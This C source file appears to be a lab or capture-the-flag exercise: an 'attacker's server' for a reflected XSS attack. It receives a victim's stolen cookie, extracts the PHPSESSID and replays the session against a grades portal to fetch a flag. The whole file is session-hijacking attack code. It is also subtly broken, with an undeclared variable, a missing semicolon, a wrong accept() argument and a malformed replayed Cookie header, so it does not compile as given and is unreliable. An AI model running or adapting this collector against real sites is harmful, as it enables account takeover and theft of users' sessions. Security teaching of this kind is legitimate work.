/*
 * ex3_reflected.c
 * 
 * XSS Attack Demonstration - Attacker's Server
 * 
 * This program implements a simple HTTP server that listens on port 8888
 * and captures one HTTP GET request. It logs the entire request to
 * spoofed-reflected.txt for analysis, particularly to extract session cookies
 * stolen via reflected XSS attacks.
 * 
 * Compilation: gcc -Wall -Wextra -Werror -Wconversion ex3_reflected.c -o ex3_reflected
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define WEB_PORT 80
#define PORT 8888
#define BUFFER_SIZE 8192
#define WEB_IP "192.168.1.201"
#define OUTPUT_FILE "spoofed-reflected.txt"
#define COOKIE_LEN 64


/*
 * extract_sessid - Extracts only the PHPSESSID value from HTTP request
 * @request: The raw HTTP request string
 * @sessid_out: Output buffer to store the extracted PHPSESSID
 * @out_size: Size of the output buffer
 * 
 * Searches for PHPSESSID in the Cookie header or URL parameters and
 * extracts only its value without any prefix.
 * 
 * Returns: 1 on success, 0 if PHPSESSID not found or error
 */
static int extract_sessid(const char *request,
                          char *sessid_out,
                          size_t out_size)
{
  const char *cookie_start = strstr(request, "cookie=");
  if (cookie_start == NULL) {
    return 0;
  }

  cookie_start += strlen("cookie=");

  /* expect cookie=PHPSESSID=....*/
  const char *sessid = strstr(cookie_start, "PHPSESSID=");
  if (sessid == NULL)
    return 0;

  sessid += strlen("PHPSESSID=");


  const char *end = sessid;
  while (*end != '\0' &&
         *end != ' ' &&
         *end != '&' &&
         *end != '\r' &&
         *end != '\n')
  {
    end++;
  }

  size_t len = (size_t)(end - sessid);
  if (len == 0 || len >= out_size)
    return 0;

  memcpy(sessid_out, sessid, len);
  sessid_out[len] = '\0';
  return 1;
}

///*
// * extract_cookie - Extracts and prints cookie information from HTTP request
// * @request: The raw HTTP request string
// *
// * Searches for the "Cookie:" header in the HTTP request and extracts
// * session information if present.
// */
//static void extract_cookie(const char *request) {
//    const char *cookie_line = strstr(request, "Cookie:");
//    if (cookie_line == NULL) {
//        cookie_line = strstr(request, "cookie:");
//    }
//
//    if (cookie_line != NULL) {
//        const char *line_end = strstr(cookie_line, "\r\n");
//        if (line_end == NULL) {
//            line_end = strstr(cookie_line, "\n");
//        }
//
//        if (line_end != NULL) {
//            size_t cookie_len = (size_t)(line_end - cookie_line);
//            char *cookie = malloc(cookie_len + 1);
//            if (cookie != NULL) {
//                memcpy(cookie, cookie_line, cookie_len);
//                cookie[cookie_len] = '\0';
//                printf("Extracted: %s\n", cookie);
//                free(cookie);
//            }
//        }
//    }
//}
//

/*
 * send_http_response - Sends a minimal HTTP 200 OK response
 * @client_fd: File descriptor of the connected client socket
 */
static void send_http_response(int client_fd) {
    const char *response = 
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html\r\n"
        "Content-Length: 27\r\n"
        "Connection: close\r\n"
        "\r\n"
        "<html>Request logged</html>";
    
    ssize_t sent = write(client_fd, response, strlen(response));
    (void)sent;
}
/*
 * WRITE TO OUT FILE
 *  0-fail
 * 1-success
 */
int write_to_out_file(const char* buffer){
  FILE * output_file = fopen(OUTPUT_FILE, "w");
  if (!output_file) {
    return 0;
  }
  // todo maybe if is not needed
  if (fprintf(output_file, "%s", buffer) < 0) {
    fclose(output_file);
    return 0;
  }
  fclose(output_file);
  //TODO DELETE PRINT
  printf("Request written to %s\n", OUTPUT_FILE);
  return 1;
}
/*
 * RECV RESPONSE FROM WEB SERVER AND WRITES TO FILE
 * 0-fail
 * 1-success
 */
static int recv_response_from_web(int web_fd){
  char response_from_web[BUFFER_SIZE];
  memset(response_from_web,0,BUFFER_SIZE);
  ssize_t recv_len = read(web_fd, response_from_web, BUFFER_SIZE - 1);
  if (recv_len <=0){
    return 0;
  }
  response_from_web[recv_len] = '\0';
  res_write2file = write_to_out_file (response_from_web);
  return res_write2file;
}

/*
 * SEND REQUEST
 * 0-fail
 * 1-success
 *
 */
static int send_request_to_web(const char *cookie_id)
{
  int web_fd = socket (AF_INET, SOCK_STREAM, 0);
  if (web_fd < 0) return 0;

  struct sockaddr_in web_addr = {0};
  web_addr.sin_family = AF_INET;
  web_addr.sin_port = htons (WEB_PORT);

  if (inet_pton (AF_INET, WEB_IP, &web_addr.sin_addr) <= 0){
    close (web_fd);
    return 0;
}

  if (connect (web_fd, (struct sockaddr *) &web_addr, sizeof (web_addr)) < 0){
    close(web_fd);
    return 0;
  }

  // GET THE FLAG FROM 'gradesPortal.php'
  char request[BUFFER_SIZE];
  int len = snprintf (request, sizeof (request),
                      "GET /gradesPortal.php HTTP/1.1\r\n"
                      "Host: %s\r\n"
                      "Cookie: %.*s\r\n"
                      "Connection: close\r\n\r\n",
                      WEB_IP, COOKIE_LEN, cookie_id);

  if (len <= 0 || len >= BUFFER_SIZE){
    close(web_fd);
    return 0;
}

  if (send (web_fd, request, (size_t) len, 0) < 0){
    close(web_fd);
    return 0;
}

  if (recv_response_from_web (web_fd) != 1){
    close (web_fd);
    return 0;
}
  close(web_fd);
  return 1;
}

/*
 * SET UP SERVERS SOCKET
 * RETURN FD
 */
static int setup_server_socket(void)
{
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  if (fd < 0) {
    perror("socket");
    exit(EXIT_FAILURE);
  }

  int opt = 1;
  if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR,
                 &opt, (socklen_t)sizeof(opt)) < 0) {
    perror("setsockopt SO_REUSEADDR");
    close(fd);
    exit(EXIT_FAILURE);
  }
  
  if (setsockopt(fd, SOL_SOCKET, SO_REUSEPORT,
                   &opt, (socklen_t)sizeof(opt)) < 0) {
        perror("setsockopt SO_REUSEPORT");
        close(fd);
        exit(EXIT_FAILURE);
    }

  return fd;
}
/*
 * SERVER BIND AND LISTEN
 */
static int bind_and_listen(int server_fd)
{
  struct sockaddr_in server_addr;

  memset(&server_addr, 0, sizeof(server_addr));
  server_addr.sin_family = AF_INET;
  server_addr.sin_addr.s_addr = INADDR_ANY;
  server_addr.sin_port = htons(PORT);

  if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
    perror("Bind failed");
    return 0;
  }

  if (listen(server_fd, 1) < 0) {
    perror("Listen failed");
    return 0;
  }
  return 1;
}

/*
 * ACCEPT CLIENT
 */
static int accept_client(int server_fd, struct sockaddr_in *client_addr){
  socklen_t  client_addr_len = sizeof(client_addr);
  int client_fd = accept(server_fd, (struct sockaddr *)&client_addr,
                         &client_addr_len);
  return client_fd;
}

int main(void) {

    // SET UP SERVER SOCKET
    int server_fd = -1;
    server_fd = setup_server_socket();
    if (server_fd < 0)
    {
      close(server_fd);
      exit(EXIT_FAILURE);
    }
    // BIND AND LISTEN
    int bind_n_listen = bind_and_listen(server_fd);
    if (bind_n_listen!=1){
      close(server_fd);
      exit(EXIT_FAILURE);
    }
    printf("Attacker's server listening on port %d...\n", PORT);

    // ACCEPT CLIENT
    int client_fd = -1;
    struct sockaddr_in client_addr;
    client_fd = accept_client(server_fd, &client_addr);
    if (client_fd < 0){
      perror("Accept failed");
      close(server_fd);
      exit(EXIT_FAILURE);
    }
    printf("Connection received from %s:%d\n",
         inet_ntoa(client_addr.sin_addr),
         ntohs(client_addr.sin_port));

    // HANDLE CLIENT
    char buffer[BUFFER_SIZE];
    // READ STOLEN CLIENT
    ssize_t bytes_read;
    memset(buffer, 0, BUFFER_SIZE);
    bytes_read = read(client_fd, buffer, BUFFER_SIZE - 1);
    if (bytes_read < 0) {
        perror("Read failed");
        close(client_fd);
        close(server_fd);
        exit(EXIT_FAILURE);
    }
    buffer[bytes_read] = '\0';
    printf("Request captured (%zd bytes)\n", bytes_read);

//    extract_cookie(buffer);

    // EXTRACT PHDSESSID FROM STOLEN COOKIE
    char sessid[256];
    memset(sessid, 0, sizeof(sessid));
    if (extract_sessid(buffer, sessid, sizeof(sessid))) {
        printf("PHPSESSID stored: %s\n", sessid);
    } else {
        printf("PHPSESSID not found in request\n");
    }

    // SEND RESPONSE TO CLIENT
    send_http_response(client_fd);

    // SEND REQUEST TO WEB AND SAVE RESPONSE TO OUT FILE
    if (send_request_to_web(sessid)!=1){

        close(client_fd);
        close(server_fd);
        printf ("Failed to send request to web")
        exit(EXIT_FAILURE);
    }

    // TERMINATE
    close(client_fd);
    close(server_fd);
    printf("Server shutting down gracefully.\n");

    exit (EXIT_SUCCESS);
}
